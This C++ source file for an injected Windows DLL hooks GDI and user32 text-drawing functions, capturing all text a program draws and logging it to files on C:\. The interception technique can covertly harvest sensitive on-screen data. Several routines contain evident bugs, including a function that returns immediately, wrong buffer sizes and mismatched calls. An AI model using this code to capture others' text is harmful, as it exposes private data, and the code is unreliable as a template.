#include "hook_dll.h"
#include "Array.h"
#include "externs.h"



void setFuncHooks(char *szHookFunc)
{
	HMODULE hWsLib = LoadLibrary("gdi32.dll");
	if(hWsLib)
	{
		if(!StrCmpI(szHookFunc,"TextOutW"))
		{
			p_TextOutWProc = (pTextOutW)GetProcAddress(hWsLib,"TextOutW");
			p_TextOutWOldProc = (pTextOutW)Hook(p_TextOutWProc,New_TextOutW);
			return;
		}

		if(!StrCmpI(szHookFunc,"GetTextExtentPointW"))
		{
			p_GetTextExtentPointWProc = (pGetTextExtentPointW)GetProcAddress(hWsLib,"GetTextExtentPointW");
			p_GetTextExtentPointWOldProc = (pGetTextExtentPointW)Hook(p_GetTextExtentPointWProc,New_GetTextExtentPointW);
			return;
		}

		if(!StrCmpI(szHookFunc,"ExtTextOutW"))
		{
			p_ExtTextOutWProc = (pExtTextOutW)GetProcAddress(hWsLib,"ExtTextOutW");
			p_ExtTextOutWOldProc = (pExtTextOutW)Hook(p_ExtTextOutWProc,New_ExtTextOutW);
			return;
		}

		if(!StrCmpI(szHookFunc,"ExtTextOutA"))
		{
			p_ExtTextOutAProc = (pExtTextOutA)GetProcAddress(hWsLib,"ExtTextOutA");
			p_ExtTextOutAOldProc = (pExtTextOutA)Hook(p_ExtTextOutAProc,New_ExtTextOutA);
			return;
		}
	}

	hWsLib = LoadLibrary("user32.dll");
	if(hWsLib)
	{
		if(!StrCmpI(szHookFunc,"DrawTextW"))
		{
			p_DrawTextWProc = (pDrawTextW)GetProcAddress(hWsLib,"DrawTextW");
			p_DrawTextWOldProc = (pDrawTextW)Hook(p_DrawTextWProc,New_DrawTextW);
			return;
		}

		if(!StrCmpI(szHookFunc,"DrawTextExW"))
		{
			p_DrawTextExWProc = (pDrawTextExW)GetProcAddress(hWsLib,"DrawTextExW");
			p_DrawTextExWOldProc = (pDrawTextExW)Hook(p_DrawTextExWProc,New_DrawTextExW);
			return;
		}
	}


}


void delFuncHooks()
{
	if(p_TextOutWOldProc)		UnHook(p_TextOutWProc,p_TextOutWOldProc);
	p_TextOutWOldProc			= 0;

	if(p_DrawTextWOldProc)		UnHook(p_DrawTextWProc,p_DrawTextWOldProc);
	p_DrawTextWOldProc			= 0;

	if(p_DrawTextExWOldProc)		UnHook(p_DrawTextExWProc,p_DrawTextExWOldProc);
	p_DrawTextExWOldProc			= 0;

	if(p_ExtTextOutWOldProc)	UnHook(p_ExtTextOutWProc,p_ExtTextOutWOldProc);
	p_ExtTextOutWOldProc		= 0;

	if(p_ExtTextOutAOldProc)	UnHook(p_ExtTextOutAProc,p_ExtTextOutAOldProc);
	p_ExtTextOutAOldProc		= 0;

	if(p_GetTextExtentPointWOldProc) UnHook(p_GetTextExtentPointWProc,p_GetTextExtentPointWOldProc);
	p_GetTextExtentPointWOldProc=0;	
}



char* WCharToChar(WCHAR* wString,int cbString)
{
	int Size = cbString+1*2;//lstrlenW((LPCTSTR)wString)+1;
	char* wData = (char*)GlobalAlloc(GPTR,Size);
	WideCharToMultiByte(CP_ACP,0,wString,cbString,wData,Size,0,0);
	return wData;
}

BOOL isTextExist(char *szData)
{return false;
	unsigned int hash1 = CalcHash(szData);
	for(int i=wordsArr.Count(); i; i--)
	{
		unsigned int hash2 = (unsigned int)wordsArr.Get(i);
		if(hash2 == hash1) return true;
	}

	
}



#pragma optimize( "", off )


BOOL WINAPI New_ExtTextOutW(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx)
{
	PUSH_ALL_REG;
	BOOL result = false;
		
	WORD szAscII[0x200];
			WORD glyphs[0x100];
			char szBuf[512];

	if(p_ExtTextOutWOldProc)
	{
		if(fuOptions & ETO_GLYPH_INDEX)
		{
			OutputDebugString("New_ExtTextOutW: ETO_GLYPH_INDEX set");
			char *newStr = (char*)GlobalAlloc(GPTR,cbCount+1);
			WORD *origStr = (WORD*)lpString;
			for(int i=0;i<cbCount;i++)
			{
				newStr[i] = origStr[i]+0x1D;
			}

			wsprintf(szBuf,"C:\\%s%u.dat",newStr,GetTickCount());
			writeFile(szBuf,(char*)lpString,cbCount*2,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL);

			saveText(hdc,newStr,lstrlen(newStr),"ExtTextOutW",X,Y);
				GlobalFree(newStr);
			
		}
		else
		{
			char *szData = WCharToChar((WCHAR*)lpString,cbCount);
			if(szData)
			{
				saveText(hdc,szData,lstrlen(szData),"ExtTextOutW",X,Y);
				GlobalFree(szData);
			}
		}
		
		result = p_ExtTextOutWOldProc(hdc,X,Y,fuOptions,lprc,lpString,cbCount,lpDx);
	}
	POP_ALL_REG;
	return result;
}

BOOL WINAPI New_ExtTextOutA(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx)
{
	PUSH_ALL_REG;
	BOOL result = false;
		
	if(p_ExtTextOutWOldProc)
	{
		saveText(hdc,(char*)lpString,lstrlen(lpString),"ExtTextOutA",X,Y);
		
		result = p_ExtTextOutAOldProc(hdc,X,Y,fuOptions,lprc,lpString,cbCount,lpDx);
	}
	POP_ALL_REG;
	return result;
}


int WINAPI New_DrawTextW(HDC hDC,LPCTSTR lpString,int nCount,LPRECT lpRect,UINT uFormat)
{
	PUSH_ALL_REG;
	int result = 0;
	//	OutputDebugString("HOOK_DLL: New_DrawTextW");
	if(p_DrawTextWOldProc)
	{
		char *szData = WCharToChar((WCHAR*)lpString,nCount);
		if(szData)
		{
			saveText(hDC,szData,lstrlen(szData),"DrawTextW",lpRect->left,lpRect->top);
			GlobalFree(szData);
		}
		result = p_DrawTextWOldProc(hDC,lpString,nCount,lpRect,uFormat);
	}

	POP_ALL_REG;
	return result;
}

int WINAPI New_DrawTextExW(HDC hdc,LPTSTR lpchText,int cchText,LPRECT lprc,UINT dwDTFormat,LPDRAWTEXTPARAMS lpDTParams)
{
	PUSH_ALL_REG;
	int result = 0;
		
	if(p_DrawTextExWOldProc)
	{
		char *szData = WCharToChar((WCHAR*)lpchText,cchText);
		if(szData)
		{
			saveText(hdc,szData,lstrlen(szData),"DrawTextExW",lprc->left,lprc->top);
			GlobalFree(szData);
		}
		result = p_DrawTextExWOldProc(hdc,lpchText,cchText,lprc,dwDTFormat,lpDTParams);
	}

	POP_ALL_REG;
	return result;
}


BOOL WINAPI New_TextOutW(HDC hdc,int nXStart,int nYStart,LPCTSTR lpString, int cbString)
{
	PUSH_ALL_REG;
	BOOL result = false;
	char buff[512];
	//	OutputDebugString("HOOK_DLL: New_TextOutW");
	if(p_TextOutWOldProc)
	{
		RtlZeroMemory(buff,512);
		RtlMoveMemory(buff,lpString,cbString);
		//OutputDebugStringW((WCHAR*)&buff);
		char *szData = WCharToChar((WCHAR*)lpString,cbString);
		if(szData)
		{
			//OutputDebugString(szData);
			saveText(hdc,szData,lstrlen(szData),"TextOutW",nXStart,nYStart);
			
			wsprintf(buff,"HDC=0x%X,nXStart=%u,nYStart=%u,lpString=%s,cbString=%u\r\n\r\n",
				hdc,nXStart,nYStart,szData,cbString
				
				);


			writeFile("C:\\log4.txt",buff,lstrlen(buff),OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL);
			
			GlobalFree(szData);
		}
		
		result = p_TextOutWOldProc(hdc,nXStart,nYStart,lpString,cbString);
	}
	POP_ALL_REG;
	return result;

}

BOOL WINAPI New_GetTextExtentPointW(HDC hdc,LPCTSTR lpString,int cbString,LPSIZE lpSize)
{
	PUSH_ALL_REG;
	BOOL result = false;

	if(p_GetTextExtentPointWOldProc)
	{
		result = p_GetTextExtentPointWOldProc(hdc,lpString,cbString,lpSize);
		
		char *szData = WCharToChar((WCHAR*)lpString,cbString);
		if(szData)
		{
			saveText(hdc,szData,lstrlen(szData),"GetTextExtentPointW",lpSize->cx,lpSize->cy);

			writeFile("C:\\log3.txt",szData,lstrlen(szData),OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL);

			GlobalFree(szData);
		}
		
		
	}

	POP_ALL_REG;
	return result;
}





#pragma optimize( "", on )


unsigned int WINAPI CalcHash(char *string,int strSize)
{
	unsigned int hash = 0;
	register int i=0;
	
	for(; strSize != 0; i++,strSize--)
	{
		hash = (((hash << 7) & 0xFFFFFFFF) | (hash >> (32-7))) ^ (unsigned char)string[i];
	}
	
	return hash;
}


unsigned int isNewString(char *szSubString,int szDataSize)
{
	unsigned int origHash = CalcHash(szSubString,szDataSize);

	EnterCriticalSection(&grabDataSection);
	for(int i=wordsArr.Count(); i; i--)
	{
		unsigned int hash = (unsigned int)wordsArr.Get(i);
		if(hash == origHash)
		{
			origHash = 0;
			break;
		}
	}
	LeaveCriticalSection(&grabDataSection);

	return origHash;
}


void saveText(HDC hDC,char *szData,int szDataSize,char *str1,int x,int y)
{
	char lpFileName[MAX_PATH];
	char lpClassName[MAX_PATH];
	WINDOWINFO pwi;
	POINT pt;
unsigned int strHash=0;

char szTmpBuf[512];

	if(hashstr)
		strHash = isNewString(szData,szDataSize);

		EnterCriticalSection(&grabDataSection);

		if(hashstr)
			wordsArr.Add((void*)strHash);

		BOOL processed = false;
		if(compiletostringline)
		{

			int count = wordsInfoArr.Count();

			for(;count;count--)
			{
				words_info *wi = (words_info *)wordsInfoArr.Get(count);
				if(wi->y == y)
				{
					int count2 = wi->words->Count();
					for(;count2;count2--)
					{
						word_info *w = (word_info *)wi->words->Get(count2);
						if(w->x == x)
						{
							unsigned int newStrHash = CalcHash(szData,szDataSize);
							if(w->hash != newStrHash)
							{

								MyFree(w->word);
								w->word = (char*)MyRealloc(0,szDataSize+1);
								RtlMoveMemory(w->word,szData,szDataSize);
								w->hash = newStrHash;
								
							}
							processed = true;
							break ;
						}
					}

					if(processed) break;

					word_info *w = (word_info *)MyRealloc(0,sizeof(word_info));
					w->hash = CalcHash(szData,szDataSize);
					w->hdc = hDC;
					w->word = (char*)MyRealloc(0,szDataSize+1);
					RtlMoveMemory(w->word,szData,szDataSize);
					w->x = x;
					w->y = y;


						wi->words->Add(w);
					

					processed = true;
					break ;

				}
			}

			if(!processed)
			{

				words_info *wi = (words_info *)MyRealloc(0,sizeof(words_info));

				wi->y = y;
				wi->words = new myArraySort();

				wordsInfoArr.Add(wi);
				word_info *w = (word_info *)MyRealloc(0,sizeof(word_info));
				w->hash = CalcHash(szData,szDataSize);
				w->hdc = hDC;
				w->word = (char*)MyRealloc(0,szDataSize+1);
				RtlMoveMemory(w->word,szData,szDataSize);
				w->x = x;
				w->y = y;
				wi->words->Add(w);
				processed = true;

			}
		}
		else
		{
			char *tmpStr = (char*)GlobalAlloc(GPTR,szDataSize+1);
			RtlMoveMemory(tmpStr,szData,szDataSize);
			HWND hWnd = WindowFromDC(hDC);
			LONG_PTR lptrWinID = GetWindowLongPtr(hWnd,GWLP_ID);
			char *rezBuf = (char*)GlobalAlloc(GPTR,szDataSize+MAX_PATH);
			int strSize =  wsprintf(rezBuf,"%s:ID=%u=%s\r\n",str1,lptrWinID,tmpStr);

			szTextData = (char*)MyRealloc(szTextData,strSize+2);
			lstrcat(szTextData,rezBuf);
			
			writeFile("C:\\log.txt",rezBuf,lstrlen(rezBuf),OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL);
			GlobalFree(tmpStr);	
		
		}
		
		
		LeaveCriticalSection(&grabDataSection);

	
	return;
	
}

